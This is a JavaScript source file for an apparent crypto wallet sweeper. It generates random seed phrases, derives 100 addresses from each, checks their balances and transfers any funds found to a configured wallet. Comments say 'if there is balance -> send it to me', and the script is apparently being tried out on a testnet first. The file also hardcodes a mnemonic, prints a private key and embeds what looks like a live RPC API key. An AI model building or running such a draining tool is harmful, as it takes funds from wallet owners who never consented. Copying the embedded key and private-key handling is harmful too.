const Web3 = require('web3');
const fs = require('fs');
const readline = require('readline');
const bip39 = require("bip39");
const eHDWallet = require('ethereum-hdwallet');
const configJS = require('./config');

async function test(){
    const seed = "business midnight victory romance until sadness soldier knife foot raccoon coffee tonight";
    let ethweb3 = new Web3('https://eth-mainnet.g.alchemy.com/v2/sHkGOTiXulO7qo5IjGE7UvZB7XZVP5Yx');

    let ehdwallet = eHDWallet.fromMnemonic(seed)
    console.log(`0x${ehdwallet.derive("m/44'/60'/0'/0/0").getAddress().toString('hex')}`) // 
    console.log(`0x${ehdwallet.derive("m/44'/60'/0'/0/0").getPrivateKey().toString('hex')}`)

    console.log(`0x${ehdwallet.derive("m/44'/60'/0'/0/1").getAddress().toString('hex')}`) // 
}

async function lib_loadCsvToWrite(path, file){

    pathfile = path + file;
    let WritefileStream = await fs.createWriteStream(pathfile, 
    {
        'flags': 'a', 
        'encoding': null,
        'mode': 0666
    });

    return WritefileStream;
}

async function lib_loadCsvToList(path, file){

    pathfile = path + file;
    
    let ReadStream = fs.createReadStream(pathfile);
    const rl = readline.createInterface({
        input: ReadStream,
        crlfDelay: Infinity
    });

    let List = []

    for await (const line of rl) {
        List.push(line);
    }

    return List;
}

async function lib_generateSeed(){
    return bip39.generateMnemonic();
}

async function main() {

    let bip39_path = './scripts/seed/';
    let bip39_file = 'seed.csv';
    let bip39_list = []
    bip39_list = await lib_loadCsvToList(bip39_path, bip39_file);
    let bip39_writeFileStream = await lib_loadCsvToWrite(bip39_path, bip39_file);

    // const seed = "business midnight victory romance until sadness soldier knife foot raccoon coffee tonight";

    // const seed_ran = await lib_generateSeed();
    // console.log(seed_ran);
    // const seed = 'business midnight victory romance until sadness soldier knife foot raccoon coffee tonight';

    // console.log(bip39_list[0][0]);
    // console.log(bip39_list);
    // console.log(seed);

    // const arr = [1, 2];

    // console.log(bip39_list.includes(seed)); // true
    // await bip39_writeFileStream.write( seed +'\n' );
    // await WritefileStream.write( seed +'\n' );
     

    // loop 10 times to generate random seeds
    let ethweb3 = new Web3('https://eth-mainnet.g.alchemy.com/v2/sHkGOTiXulO7qo5IjGE7UvZB7XZVP5Yx');
    let baobabweb3 = new Web3('https://api.baobab.klaytn.net:8651');

    let seed_index = 0;
    let balance = 0;
    let gas_limit = "0x100000"
    let BN = baobabweb3.utils.BN;
    while (seed_index < 1){
        let seed = await lib_generateSeed();
        while (bip39_list.includes(seed)){
            seed = await lib_generateSeed();
        }
        // test
        seed = "business midnight victory romance until sadness soldier knife foot raccoon coffee tonight";
        const ehdwallet = eHDWallet.fromMnemonic(seed);
        let account_index = 0
        while (account_index < 100){
            pubkey = ehdwallet.derive(`m/44'/60'/0'/0/${account_index}`).getAddress().toString('hex')
            console.log(pubkey)
            // baobabweb3
            balance = await baobabweb3.eth.getBalance(pubkey);
            if (balance > 0 ){
                let send_wei = baobabweb3.utils.toWei(balance, 'ether');

                // let gas_amount = await contractOBJ.methods.mint(
                //     to,
                //     amount
                // ).estimateGas({from: public_key})

                let gas_amount = 21000;

                console.log(send_wei)

                let gas_price = await baobabweb3.eth.getGasPrice()
                let tell = await new BN(gas_amount).mul(new BN(gas_price));
                console.log(tell)
                let gas_fee = baobabweb3.utils.toWei(tell, 'wei');
                console.log(gas_fee)

                send_wei = send_wei.sub(gas_fee)

                // console.log(gas_fee)

                await baobabweb3.eth.accounts.wallet.add(ehdwallet.derive(`m/44'/60'/0'/0/${account_index}`).getPrivateKey().toString('hex'));

                let receipt = await baobabweb3.eth.sendTransaction({
                    from: pubkey,
                    to: configJS.baobob_wallet,
                    value: send_wei,
                    gasLimit: gas_amount, // 100000
                    gasPrice: gas_price
                });
                await console.log(receipt);
            }
            // check balance
            // if there is balance -> send it to me
            // working 하는지 확인 위해 baobab으로 테스트
            
            account_index++;
            
        }
        // await bip39_writeFileStream.write( seed +'\n' );
        
        // console.log(seed)
        seed_index++;
    }

    // const seed_ran = await lib_generateSeed();

    // make csv
    // get seed phrase
    // -> save seed phrase to seed csv
    // -> check whether this is 
    // loop 100 address
    // 
    // when there is balance, transfer it 
}

if (require.main === module) {
    main();
}


module.exports = { 
    lib_loadCsvToWrite, lib_generateSeed
};